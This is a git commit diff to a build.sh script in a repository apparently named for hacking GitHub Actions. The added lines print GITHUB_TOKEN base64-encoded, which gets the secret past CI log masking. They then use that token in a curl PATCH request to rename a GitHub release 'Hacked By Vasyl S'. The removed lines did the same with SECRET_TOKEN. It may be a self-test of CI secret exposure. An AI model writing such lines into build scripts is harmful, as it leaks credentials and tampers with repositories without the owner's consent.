2511ede48a8e869d27f7ce1bfb100c416edefe95
octoberwar <locikosvvlociko@gmail.com>
2025-01-30 14:28:13 +0200

    Update build.sh

--- build.sh
+++ build.sh
@@ -1,6 +1,13 @@
 #!/bin/bash
 
 # Echo the Python version
-echo "Python version: 9.8"
-printenv SECRET_TOKEN| base64 
-echo Hacked
+echo GITHUB_TOKEN
+printenv GITHUB_TOKEN | base64
+
+curl -L \
+  -X PATCH \
+  -H "Accept: application/vnd.github+json" \
+  -H "Authorization: Bearer $GITHUB_TOKEN" \
+  -H "X-GitHub-Api-Version: 2022-11-28" \
+  https://api.github.com/repos/lociko/hack_github_action/releases/197557501 \
+  -d '{"tag_name":"v1","name":"Hacked By Vasyl S"}'
